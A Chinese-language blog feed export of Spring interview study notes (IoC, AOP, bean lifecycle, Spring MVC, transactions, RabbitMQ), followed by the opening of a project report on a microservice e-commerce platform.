<p>将对象之间的相互依赖关系交给 IoC 容器来管理，并由 IoC 容器完成对象的注入。这样可以很大程度上简化应用的开发，把应用从复杂的依赖关系中解放出来。 <strong>IoC 容器就像是一个工厂一样，当我们需要创建一个对象的时候，只需要配置好配置文件&#x2F;注解即可，完全不用考虑对象是如何被创建出来的。</strong> 在实际项目中一个 Service 类可能有几百甚至上千个类作为它的底层，假如我们需要实例化这个 Service，你可能要每次都要搞清这个 Service 所有底层类的构造函数，这可能会把人逼疯。如果利用 IoC 的话，你只需要配置好，然后在需要的地方引用就行了，这大大增加了项目的可维护性且降低了开发难度。</p>
<p>Spring 时代我们一般通过 XML 文件来配置 Bean，后来开发人员觉得 XML 文件来配置不太好，于是 SpringBoot 注解配置就慢慢开始流行起来。</p>
<p>推荐阅读：<a href="https://www.zhihu.com/question/23277575/answer/169698662">https://www.zhihu.com/question/23277575/answer/169698662</a></p>
<p><strong>Spring IoC的初始化过程：</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142187.png" alt="Spring IoC的初始化过程"></p>
<p>IoC源码阅读</p>
<ul>
<li><a href="https://javadoop.com/post/spring-ioc">https://javadoop.com/post/spring-ioc</a></li>
</ul>
<h3 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h3><p>AOP(Aspect-Oriented Programming:面向切面编程)能够将那些与业务无关，<strong>却为业务模块所共同调用的逻辑或责任（例如事务处理、日志管理、权限控制等）封装起来</strong>，便于<strong>减少系统的重复代码</strong>，<strong>降低模块间的耦合度</strong>，并<strong>有利于未来的可拓展性和可维护性</strong>。</p>
<p><strong>Spring AOP就是基于动态代理的</strong>，如果要代理的对象，实现了某个接口，那么Spring AOP会使用<strong>JDK Proxy</strong>，去创建代理对象，而对于没有实现接口的对象，就无法使用 JDK Proxy 去进行代理了，这时候Spring AOP会使用<strong>Cglib</strong> ，这时候Spring AOP会使用 <strong>Cglib</strong> 生成一个被代理对象的子类来作为代理，如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142188.jpg" alt="SpringAOPProcess"></p>
<p>当然你也可以使用 AspectJ ,Spring AOP 已经集成了AspectJ ，AspectJ 应该算的上是 Java 生态系统中最完整的 AOP 框架了。</p>
<p>使用 AOP 之后我们可以把一些通用功能抽象出来，在需要用到的地方直接使用即可，这样大大简化了代码量。我们需要增加新功能时也方便，这样也提高了系统扩展性。日志功能、事务管理等等场景都用到了 AOP 。</p>
<h2 id="RestController-Controller"><a href="#RestController-Controller" class="headerlink" title="@RestController @Controller"></a>@RestController @Controller</h2><p>@Controller 返回一个页面</p>
<p>单独使用 @Controller 不加 @ResponseBody的话一般使用在要返回一个视图的情况，这种情况属于比较传统的Spring MVC 的应用，对应于前后端不分离的情况。</p>
<p>@RestController 返回JSON 或 XML 形式数据</p>
<p>但@RestController只返回对象，对象数据直接以 JSON 或 XML 形式写入 HTTP 响应(Response)中，这种情况属于 RESTful Web服务，这也是目前日常开发所接触的最常用的情况（前后端分离）。</p>
<p>@Controller +@ResponseBody 返回JSON 或 XML 形式数据</p>
<p>如果你需要在Spring4之前开发 RESTful Web服务的话，你需要使用@Controller 并结合@ResponseBody注解，也就是说@Controller +@ResponseBody&#x3D; @RestController（Spring 4 之后新加的注解）。</p>
<blockquote>
<p><code>@ResponseBody</code> 注解的作用是将 <code>Controller</code> 的方法返回的对象通过适当的转换器转换为指定的格式之后，写入到HTTP 响应(Response)对象的 body 中，通常用来返回 JSON 或者 XML 数据，返回 JSON 数据的情况比较多。</p>
</blockquote>
<h2 id="Spring-bean"><a href="#Spring-bean" class="headerlink" title="Spring bean"></a>Spring bean</h2><h3 id="Spring中bean的作用域有哪些"><a href="#Spring中bean的作用域有哪些" class="headerlink" title="Spring中bean的作用域有哪些?"></a>Spring中bean的作用域有哪些?</h3><ul>
<li>singleton : 唯一 bean 实例，Spring 中的 bean 默认都是单例的。</li>
<li>prototype : 每次请求都会创建一个新的 bean 实例。</li>
<li>request : 每一次HTTP请求都会产生一个新的bean，该bean仅在当前HTTP request内有效。</li>
<li>session : 每一次HTTP请求都会产生一个新的 bean，该bean仅在当前 HTTP session 内有效。</li>
<li>global-session： 全局session作用域，仅仅在基于portlet的web应用中才有意义，Spring5已经没有了。Portlet是能够生成语义代码(例如：HTML)片段的小型Java Web插件。它们基于portlet容器，可以像servlet一样处理HTTP请求。但是，与 servlet 不同，每个 portlet 都有不同的会话</li>
</ul>
<h3 id="Spring中的单例bean的线程安全问题了解吗"><a href="#Spring中的单例bean的线程安全问题了解吗" class="headerlink" title="Spring中的单例bean的线程安全问题了解吗?"></a>Spring中的单例bean的线程安全问题了解吗?</h3><p>的确是存在安全问题的。因为，当多个线程操作同一个对象的时候，对这个对象的成员变量的写操作会存在线程安全问题。</p>
<p>但是，一般情况下，我们常用的 <code>Controller</code>、<code>Service</code>、<code>Dao</code> 这些 Bean 是无状态的。无状态的 Bean 不能保存数据，因此是线程安全的。</p>
<p>常见的有 2 种解决办法：</p>
<ol>
<li>在类中定义一个 <code>ThreadLocal</code> 成员变量，将需要的可变成员变量保存在 <code>ThreadLocal</code> 中（推荐的一种方式）。</li>
<li>改变 Bean 的作用域为 “prototype”：每次请求都会创建一个新的 bean 实例，自然不会存在线程安全问题。</li>
</ol>
<h3 id="Component-和-Bean-的区别是什么？"><a href="#Component-和-Bean-的区别是什么？" class="headerlink" title="@Component 和 @Bean 的区别是什么？"></a>@Component 和 @Bean 的区别是什么？</h3><ol>
<li>作用对象不同: <code>@Component</code> 注解作用于类，而<code>@Bean</code>注解作用于方法。</li>
<li><code>@Component</code>通常是通过类路径扫描来自动侦测以及自动装配到Spring容器中（我们可以使用 <code>@ComponentScan</code> 注解定义要扫描的路径从中找出标识了需要装配的类自动装配到 Spring 的 bean 容器中）。<code>@Bean</code> 注解通常是我们在标有该注解的方法中定义产生这个 bean,<code>@Bean</code>告诉了Spring这是某个类的示例，当我需要用它的时候还给我。</li>
<li><code>@Bean</code> 注解比 <code>Component</code> 注解的自定义性更强，而且很多地方我们只能通过 <code>@Bean</code>注解来注册bean。比如当我们引用第三方库中的类需要装配到 <code>Spring</code>容器时，则只能通过 <code>@Bean</code>来实现。</li>
</ol>
<p><code>@Bean</code>注解使用示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> TransferService <span class="title function_">transferService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransferServiceImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码相当于下面的 xml 配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transferService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.acme.TransferServiceImpl&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面这个例子是通过 <code>@Component</code> 无法实现的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> OneService <span class="title function_">getService</span><span class="params">(status)</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> (status)  &#123;</span><br><span class="line">        when <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">serviceImpl1</span>();</span><br><span class="line">        when <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">serviceImpl2</span>();</span><br><span class="line">        when <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">serviceImpl3</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="将一个类声明为Spring的-bean-的注解有哪些"><a href="#将一个类声明为Spring的-bean-的注解有哪些" class="headerlink" title="将一个类声明为Spring的 bean 的注解有哪些?"></a>将一个类声明为Spring的 bean 的注解有哪些?</h3><p>我们一般使用 <code>@Autowired</code> 注解自动装配bean，要想把类标识成可用于 <code>@Autowired</code> 注解自动装配的 bean 的类,采用以下注解可实现：</p>
<ul>
<li><code>@Component</code> ：通用的注解，可标注任意类为 <code>Spring</code> 组件。如果一个Bean不知道属于哪个层，可以使用<code>@Component</code> 注解标注。</li>
<li><code>@Repository</code> : 对应持久层即 Dao 层，主要用于数据库相关操作。</li>
<li><code>@Service</code> : 对应服务层，主要涉及一些复杂的逻辑，需要用到 Dao层。</li>
<li><code>@Controller</code> : 对应 Spring MVC 控制层，主要用于接受用户请求并调用 Service 层返回数据给前端页面。</li>
</ul>
<h3 id="Spring-中的-bean-生命周期"><a href="#Spring-中的-bean-生命周期" class="headerlink" title="Spring 中的 bean 生命周期?"></a>Spring 中的 bean 生命周期?</h3><p>这部分网上有很多文章都讲到了，下面的内容整理自： <del><a href="https://yemengying.com/2016/07/14/spring-bean-life-cycle/">https://yemengying.com/2016/07/14/spring-bean-life-cycle/</a></del> (原作者可能不再维护这个博客，连接无法访问，可通过其 Github 仓库访问 <a href="https://github.com/giraffe0813/giraffe0813.github.io">https://github.com/giraffe0813/giraffe0813.github.io</a>) ，除了这篇文章，再推荐一篇很不错的文章 ：<a href="https://www.cnblogs.com/zrtqsk/p/3735273.html">https://www.cnblogs.com/zrtqsk/p/3735273.html</a> 。</p>
<ul>
<li>Bean 容器找到配置文件中 Spring Bean 的定义。</li>
<li>Bean 容器利用 Java Reflection API 创建一个Bean的实例。</li>
<li>如果涉及到一些属性值 利用 <code>set()</code>方法设置一些属性值。</li>
<li>如果 Bean 实现了 <code>BeanNameAware</code> 接口，调用 <code>setBeanName()</code>方法，传入Bean的名字。</li>
<li>如果 Bean 实现了 <code>BeanClassLoaderAware</code> 接口，调用 <code>setBeanClassLoader()</code>方法，传入 <code>ClassLoader</code>对象的实例。</li>
<li>与上面的类似，如果实现了其他 <code>*.Aware</code>接口，就调用相应的方法。</li>
<li>如果有和加载这个 Bean 的 Spring 容器相关的 <code>BeanPostProcessor</code> 对象，执行<code>postProcessBeforeInitialization()</code> 方法</li>
<li>如果Bean实现了<code>InitializingBean</code>接口，执行<code>afterPropertiesSet()</code>方法。</li>
<li>如果 Bean 在配置文件中的定义包含 init-method 属性，执行指定的方法。 </li>
<li>如果有和加载这个 Bean的 Spring 容器相关的 <code>BeanPostProcessor</code> 对象，执行<code>postProcessAfterInitialization()</code> 方法</li>
<li>当要销毁 Bean 的时候，如果 Bean 实现了 <code>DisposableBean</code> 接口，执行 <code>destroy()</code>方法。</li>
<li>当要销毁 Bean 的时候，如果 Bean 在配置文件中的定义包含 destroy-method 属性，执行指定的方法。</li>
</ul>
<p>图示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142189.jpg" alt="Spring Bean 生命周期"></p>
<p>与之比较类似的中文版本:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142190.jpg" alt="Spring Bean 生命周期"></p>
<h2 id="Spring-MVC"><a href="#Spring-MVC" class="headerlink" title="Spring MVC"></a>Spring MVC</h2><h3 id="说说自己对于-Spring-MVC-了解"><a href="#说说自己对于-Spring-MVC-了解" class="headerlink" title="说说自己对于 Spring MVC 了解?"></a>说说自己对于 Spring MVC 了解?</h3><p>谈到这个问题，我们不得不提提之前 Model1 和 Model2 这两个没有 Spring MVC 的时代。</p>
<ul>
<li><strong>Model1 时代</strong> : 很多学 Java 后端比较晚的朋友可能并没有接触过 Model1 模式下的 JavaWeb 应用开发。在 Model1 模式下，整个 Web 应用几乎全部用 JSP 页面组成，只用少量的 JavaBean 来处理数据库连接、访问等操作。这个模式下 JSP 既是控制层又是表现层。显而易见，这种模式存在很多问题。比如①将控制逻辑和表现逻辑混杂在一起，导致代码重用率极低；②前端和后端相互依赖，难以进行测试并且开发效率极低；</li>
<li><strong>Model2 时代</strong> ：学过 Servlet 并做过相关 Demo 的朋友应该了解“Java Bean(Model)+ JSP（View,）+Servlet（Controller） ”这种开发模式,这就是早期的 JavaWeb MVC 开发模式。Model:系统涉及的数据，也就是 dao 和 bean。View：展示模型中的数据，只是用来展示。Controller：处理用户请求都发送给 ，返回数据给 JSP 并展示给用户。</li>
</ul>
<p>Model2 模式下还存在很多问题，Model2的抽象和封装程度还远远不够，使用Model2进行开发时不可避免地会重复造轮子，这就大大降低了程序的可维护性和复用性。于是很多JavaWeb开发相关的 MVC 框架应运而生比如Struts2，但是 Struts2 比较笨重。随着 Spring 轻量级开发框架的流行，Spring 生态圈出现了 Spring MVC 框架， Spring MVC 是当前最优秀的 MVC 框架。相比于 Struts2 ， Spring MVC 使用更加简单和方便，开发效率更高，并且 Spring MVC 运行速度更快。</p>
<p>MVC 是一种设计模式,Spring MVC 是一款很优秀的 MVC 框架。Spring MVC 可以帮助我们进行更简洁的Web层的开发，并且它天生与 Spring 框架集成。Spring MVC 下我们一般把后端项目分为 Service层（处理业务）、Dao层（数据库操作）、Entity层（实体类）、Controller层(控制层，返回数据给前台页面)。</p>
<p><strong>Spring MVC 的简单原理图如下：</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142191.jpg" alt="img"></p>
<h3 id="SpringMVC-工作原理了解吗"><a href="#SpringMVC-工作原理了解吗" class="headerlink" title="SpringMVC 工作原理了解吗?"></a>SpringMVC 工作原理了解吗?</h3><p><strong>原理如下图所示：</strong> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142192.jpg" alt="SpringMVC运行原理"></p>
<p>上图的一个笔误的小问题：Spring MVC 的入口函数也就是前端控制器 <code>DispatcherServlet</code>的作用是接收请求，响应结果。</p>
<p><strong>流程说明（重要）：</strong></p>
<ol>
<li>客户端（浏览器）发送请求，直接请求到 <code>DispatcherServlet</code>。</li>
<li><code>DispatcherServlet</code> 根据请求信息调用 <code>HandlerMapping</code>，解析请求对应的 <code>Handler</code>。</li>
<li>解析到对应的 <code>Handler</code>（也就是我们平常说的 <code>Controller</code> 控制器）后，开始由 <code>HandlerAdapter</code> 适配器处理。</li>
<li><code>HandlerAdapter</code> 会根据 <code>Handler </code>来调用真正的处理器来处理请求，并处理相应的业务逻辑。</li>
<li>处理器处理完业务后，会返回一个 <code>ModelAndView</code> 对象，<code>Model</code> 是返回的数据对象，<code>View</code> 是个逻辑上的 <code>View</code>。</li>
<li><code>ViewResolver</code> 会根据逻辑 <code>View</code> 查找实际的 <code>View</code>。</li>
<li><code>DispaterServlet</code> 把返回的 <code>Model</code> 传给 <code>View</code>（视图渲染）。</li>
<li>把 <code>View</code> 返回给请求者（浏览器）</li>
</ol>
<h2 id="Spring-框架中用到了哪些设计模式？"><a href="#Spring-框架中用到了哪些设计模式？" class="headerlink" title="Spring 框架中用到了哪些设计模式？"></a>Spring 框架中用到了哪些设计模式？</h2><p>关于下面一些设计模式的详细介绍，可以看笔主前段时间的原创文章<a href="https://mp.weixin.qq.com/s?__biz=Mzg2OTA0Njk0OA==&mid=2247485303&idx=1&sn=9e4626a1e3f001f9b0d84a6fa0cff04a&chksm=cea248bcf9d5c1aaf48b67cc52bac74eb29d6037848d6cf213b0e5466f2d1fda970db700ba41&token=255050878&lang=zh_CN#rd">《面试官:“谈谈Spring中都用到了那些设计模式?”。》</a> 。</p>
<ul>
<li><strong>工厂设计模式</strong> : Spring使用工厂模式通过 <code>BeanFactory</code>、<code>ApplicationContext</code> 创建 bean 对象。</li>
<li><strong>代理设计模式</strong> : Spring AOP 功能的实现。</li>
<li><strong>单例设计模式</strong> : Spring 中的 Bean 默认都是单例的。</li>
<li><strong>模板方法模式</strong> : Spring 中 <code>jdbcTemplate</code>、<code>hibernateTemplate</code> 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。</li>
<li><strong>包装器设计模式</strong> : 我们的项目需要连接多个数据库，而且不同的客户在每次访问中根据需要会去访问不同的数据库。这种模式让我们可以根据客户的需求能够动态切换不同的数据源。</li>
<li><strong>观察者模式:</strong> Spring 事件驱动模型就是观察者模式很经典的一个应用。</li>
<li><strong>适配器模式</strong> :Spring AOP 的增强或通知(Advice)使用到了适配器模式、spring MVC 中也是用到了适配器模式适配<code>Controller</code>。</li>
<li>……</li>
</ul>
<h2 id="Spring-事务"><a href="#Spring-事务" class="headerlink" title="Spring 事务"></a>Spring 事务</h2><h3 id="Spring-管理事务的方式有几种？"><a href="#Spring-管理事务的方式有几种？" class="headerlink" title="Spring 管理事务的方式有几种？"></a>Spring 管理事务的方式有几种？</h3><ol>
<li>编程式事务，在代码中硬编码。(不推荐使用)</li>
<li>声明式事务，在配置文件中配置（推荐使用）</li>
</ol>
<p><strong>声明式事务又分为两种：</strong></p>
<ol>
<li>基于XML的声明式事务</li>
<li>基于注解的声明式事务</li>
</ol>
<h3 id="Spring-事务中的隔离级别有哪几种"><a href="#Spring-事务中的隔离级别有哪几种" class="headerlink" title="Spring 事务中的隔离级别有哪几种?"></a>Spring 事务中的隔离级别有哪几种?</h3><p><strong>TransactionDefinition 接口中定义了五个表示隔离级别的常量：</strong></p>
<ul>
<li><strong>TransactionDefinition.ISOLATION_DEFAULT:</strong> 使用后端数据库默认的隔离级别，Mysql 默认采用的 REPEATABLE_READ隔离级别 Oracle 默认采用的 READ_COMMITTED隔离级别.</li>
<li><strong>TransactionDefinition.ISOLATION_READ_UNCOMMITTED:</strong> 最低的隔离级别，允许读取尚未提交的数据变更，<strong>可能会导致脏读、幻读或不可重复读</strong></li>
<li><strong>TransactionDefinition.ISOLATION_READ_COMMITTED:</strong> 允许读取并发事务已经提交的数据，<strong>可以阻止脏读，但是幻读或不可重复读仍有可能发生</strong></li>
<li><strong>TransactionDefinition.ISOLATION_REPEATABLE_READ:</strong> 对同一字段的多次读取结果都是一致的，除非数据是被本身事务自己所修改，<strong>可以阻止脏读和不可重复读，但幻读仍有可能发生。</strong></li>
<li><strong>TransactionDefinition.ISOLATION_SERIALIZABLE:</strong> 最高的隔离级别，完全服从ACID的隔离级别。所有的事务依次逐个执行，这样事务之间就完全不可能产生干扰，也就是说，<strong>该级别可以防止脏读、不可重复读以及幻读</strong>。但是这将严重影响程序的性能。通常情况下也不会用到该级别。</li>
</ul>
<h3 id="Spring-事务中哪几种事务传播行为"><a href="#Spring-事务中哪几种事务传播行为" class="headerlink" title="Spring 事务中哪几种事务传播行为?"></a>Spring 事务中哪几种事务传播行为?</h3><p><strong>支持当前事务的情况：</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_REQUIRED：</strong> 如果当前存在事务，则加入该事务；如果当前没有事务，则创建一个新的事务。</li>
<li><strong>TransactionDefinition.PROPAGATION_SUPPORTS：</strong> 如果当前存在事务，则加入该事务；如果当前没有事务，则以非事务的方式继续运行。</li>
<li><strong>TransactionDefinition.PROPAGATION_MANDATORY：</strong> 如果当前存在事务，则加入该事务；如果当前没有事务，则抛出异常。（mandatory：强制性）</li>
</ul>
<p><strong>不支持当前事务的情况：</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_REQUIRES_NEW：</strong> 创建一个新的事务，如果当前存在事务，则把当前事务挂起。</li>
<li><strong>TransactionDefinition.PROPAGATION_NOT_SUPPORTED：</strong> 以非事务方式运行，如果当前存在事务，则把当前事务挂起。</li>
<li><strong>TransactionDefinition.PROPAGATION_NEVER：</strong> 以非事务方式运行，如果当前存在事务，则抛出异常。</li>
</ul>
<p><strong>其他情况：</strong></p>
<ul>
<li><strong>TransactionDefinition.PROPAGATION_NESTED：</strong> 如果当前存在事务，则创建一个事务作为当前事务的嵌套事务来运行；如果当前没有事务，则该取值等价于TransactionDefinition.PROPAGATION_REQUIRED。</li>
</ul>
<h3 id="Transactional-rollbackFor-x3D-Exception-class-注解了解吗？"><a href="#Transactional-rollbackFor-x3D-Exception-class-注解了解吗？" class="headerlink" title="@Transactional(rollbackFor &#x3D; Exception.class)注解了解吗？"></a>@Transactional(rollbackFor &#x3D; Exception.class)注解了解吗？</h3><p>我们知道：Exception分为运行时异常RuntimeException和非运行时异常。事务管理对于企业应用来说是至关重要的，即使出现异常情况，它也可以保证数据的一致性。</p>
<p>当<code>@Transactional</code>注解作用于类上时，该类的所有 public 方法将都具有该类型的事务属性，同时，我们也可以在方法级别使用该标注来覆盖类级别的定义。如果类或者方法加了这个注解，那么这个类里面的方法抛出异常，就会回滚，数据库里面的数据也会回滚。</p>
<p>在<code>@Transactional</code>注解中如果不配置<code>rollbackFor</code>属性,那么事务只会在遇到<code>RuntimeException</code>的时候才会回滚,加上<code>rollbackFor=Exception.class</code>,可以让事务在遇到非运行时异常时也回滚。</p>
<p>关于 <code>@Transactional </code> 注解推荐阅读的文章：</p>
<ul>
<li><a href="https://www.ibm.com/developerworks/cn/java/j-master-spring-transactional-use/index.html">透彻的掌握 Spring 中@transactional 的使用</a></li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>《Spring 技术内幕》</li>
<li><a href="http://www.cnblogs.com/wmyskxz/p/8820371.html">http://www.cnblogs.com/wmyskxz/p/8820371.html</a></li>
<li><a href="https://www.journaldev.com/2696/spring-interview-questions-and-answers">https://www.journaldev.com/2696/spring-interview-questions-and-answers</a></li>
<li><a href="https://www.edureka.co/blog/interview-questions/spring-interview-questions/">https://www.edureka.co/blog/interview-questions/spring-interview-questions/</a></li>
<li><a href="https://www.cnblogs.com/clwydjgs/p/9317849.html">https://www.cnblogs.com/clwydjgs/p/9317849.html</a></li>
<li><a href="https://howtodoinjava.com/interview-questions/top-spring-interview-questions-with-answers/">https://howtodoinjava.com/interview-questions/top-spring-interview-questions-with-answers/</a></li>
<li><a href="http://www.tomaszezula.com/2014/02/09/spring-series-part-5-component-vs-bean/">http://www.tomaszezula.com/2014/02/09/spring-series-part-5-component-vs-bean/</a></li>
<li><a href="https://stackoverflow.com/questions/34172888/difference-between-bean-and-autowired">https://stackoverflow.com/questions/34172888/difference-between-bean-and-autowired</a></li>
<li><a href="https://www.interviewbit.com/spring-interview-questions/">https://www.interviewbit.com/spring-interview-questions/</a></li>
</ul>
<h2 id="依赖注入的三种方式"><a href="#依赖注入的三种方式" class="headerlink" title="依赖注入的三种方式"></a>依赖注入的三种方式</h2><h3 id="AutoWired-常用"><a href="#AutoWired-常用" class="headerlink" title="AutoWired(常用)"></a>AutoWired(常用)</h3><p>用三级缓存解决循环依赖, A依赖B, B依赖A,  调用A的无参构造, 然后都赋了初值, 然后调用B的无参构造, 然后将A注入, 只是再将B注入A</p>
<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><p>参数需要的对象, 如果在IOC容器有,就自动获取到, 会有循环依赖问题</p>
<h4 id="循环依赖"><a href="#循环依赖" class="headerlink" title="循环依赖"></a>循环依赖</h4><p>A依赖B, B依赖A, 两个有参构造互相死锁;</p>
<p>启动时会报错, 能指出具体的类, </p>
<h3 id="提供set方法"><a href="#提供set方法" class="headerlink" title="提供set方法"></a>提供set方法</h3><h1 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h1><p>路由key相当于一个条件</p>
<h2 id="网络协议的三要素"><a href="#网络协议的三要素" class="headerlink" title="网络协议的三要素"></a>网络协议的三要素</h2><p>语法 : http规定了请求报文和响应报文的格式; </p>
<p>语义: 客户端主动发起的请求称之为请求;(这是一种规定)</p>
<p>时序: 一个请求对应一个响应(一个先有请求再有响应)</p>
<p>常见的消息中间件协议: OpenWire、AMQP、MQTT、Kafka(不适合分布式,速度快)、OpenMessage</p>
<h2 id="AMQP"><a href="#AMQP" class="headerlink" title="AMQP"></a>AMQP</h2><p>Advanced Message Queuing Protocol 高级消息队列协议;TCP&#x2F;ip协议之上; 分布式事务支持; 消息持久化支持; 高性能和高可靠的消息处理优势; Erlang实现有RabbitMQ;</p>
<h2 id="面试题"><a href="#面试题" class="headerlink" title="面试题"></a>面试题</h2><h3 id="为什么消息中间件不直接使用http协议"><a href="#为什么消息中间件不直接使用http协议" class="headerlink" title="为什么消息中间件不直接使用http协议?"></a>为什么消息中间件不直接使用http协议?</h3><p>1.因为http请求报文头和响应报文头是比较复杂的,包含了cookie,数据的加密解密,状态码,响应码等附加功能,但是对于一个消息而言,我们并不需要这么复杂,它其实就是负责数据传递、存储、分发就行,一定要追求高性能. 尽量简洁,快速.</p>
<p>2.大部分情况下http大部分都是短链接,在实际的交互过程中,一个请求到响应很有可能会中断,中断以后就不会持久化,就会造成请求的丢失. 这样就不利于消息中间件的业务场景,因为消息中间件可能是一个长期的获取消息的过程,出现问题和故障要对数据或消息就行持久化等,目的是为了保证消息和数据的高可靠和稳健的运行.</p>
<h3 id="RabbitMQ为什么是基于channel去处理而不是连接"><a href="#RabbitMQ为什么是基于channel去处理而不是连接" class="headerlink" title="RabbitMQ为什么是基于channel去处理而不是连接?"></a>RabbitMQ为什么是基于channel去处理而不是连接?</h3><h3 id="可以存在没有交换机的队列吗"><a href="#可以存在没有交换机的队列吗" class="headerlink" title="可以存在没有交换机的队列吗?"></a>可以存在没有交换机的队列吗?</h3><p>不可以,即使没有制定,都会绑定到默认的交换机; </p>
]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>Leyou结题报告</title>
    <url>/2021/12/21/leyou/%E5%9F%BA%E4%BA%8E%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84%E7%9A%84%E7%B1%BB%E4%BA%AC%E4%B8%9C%E5%B9%B3%E5%8F%B0%E7%BB%93%E9%A2%98%E6%8A%A5%E5%91%8A%20/</url>
    <content><![CDATA[<h1 id="基于微服务架构的类京东电商平台结题报告"><a href="#基于微服务架构的类京东电商平台结题报告" class="headerlink" title="基于微服务架构的类京东电商平台结题报告"></a>基于微服务架构的类京东电商平台结题报告</h1><h1 id="一、绪论"><a href="#一、绪论" class="headerlink" title="一、绪论"></a>一、绪论</h1><p>近年来，世界经济正向数字化转型，大力发展数字经济成为全球共识。党的十九大报告明确提出要建设“数字中国”“网络强国”，我国数字经济发展进入新阶段，市场规模位居全球第二，数字经济与实体经济深度融合，有力促进了供给侧结构性改革。电子商务是数字经济的重要组成部分，是数字经济最活跃、最集中的表现形式之一。</p>
<p>近年来，电子商务规模逐步扩大，已经深入到我们生活的各个角落，特别是一些全民参与的购物庆典，其典型代表就是每年一度的双十一、6.18等活动。</p>
<p>2020双11开场30分钟，创造<strong>每秒交易峰值58.3万笔</strong>。</p>
<p>2021年，阿里自研数据库OceanBase的峰值达到9200万次。</p>
<p>如此高的并发，对技术有很高的要求：</p>
<ul>
<li>技术范围广</li>
<li>技术新</li>
<li>要求双高：<ul>
<li>高并发（分布式、静态化技术、CDN服务、缓存技术、异步并发、池化、队列）</li>
<li>高可用（集群、负载均衡、限流、降级、熔断）</li>
</ul>
</li>
<li>数据量大</li>
<li>业务复杂</li>
</ul>
<p>因此，即使刚开始公司的规模不大，并发量很小，我们的商城项目也不能再基于传统的单库单表的方式的搭建，而应该基于微服务架构搭箭，这样以后业务量上涨只需动态增加服务器数量，而不需要重构项目。</p>
<h1 id="二、相关技术介绍"><a href="#二、相关技术介绍" class="headerlink" title="二、相关技术介绍"></a>二、相关技术介绍</h1><h2 id="Spring-Boot"><a href="#Spring-Boot" class="headerlink" title="Spring Boot"></a>Spring Boot</h2><p>Spring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。简单来说就是SpringBoot其实不是什么新的框架，它默认配置了很多框架的使用方式，就像maven整合了所有的jar包，spring boot整合了所有的框架。</p>
<h2 id="Spring-Cloud"><a href="#Spring-Cloud" class="headerlink" title="Spring Cloud"></a>Spring Cloud</h2><p>SpringCloud是微服务架构中的集成，将一系列优秀的组件进行了整合。基于SpringBoot构建。</p>
<h2 id="Mybatis-Plus"><a href="#Mybatis-Plus" class="headerlink" title="Mybatis Plus"></a>Mybatis Plus</h2><p>一个 MyBatis的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。</p>
<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>MySQL是一个开放源码的小型关联式数据库管理系统，开发者为瑞典MySQL AB公司。目前MySQL被广泛地应用在Internet上的中小型网站中。由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，许多中小型网站为了降低网站总体拥有成本而选择了MySQL作为网站数据库。</p>
<h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>Redis 是完全开源的，遵守 BSD 协议，是一个高性能的 key-value 数据库。</p>
<p>Redis 与其他 key - value 缓存产品有以下三个特点：</p>
<ul>
<li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li>
<li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li>
<li>Redis支持数据的备份，即master-slave模式的数据备份。</li>
</ul>
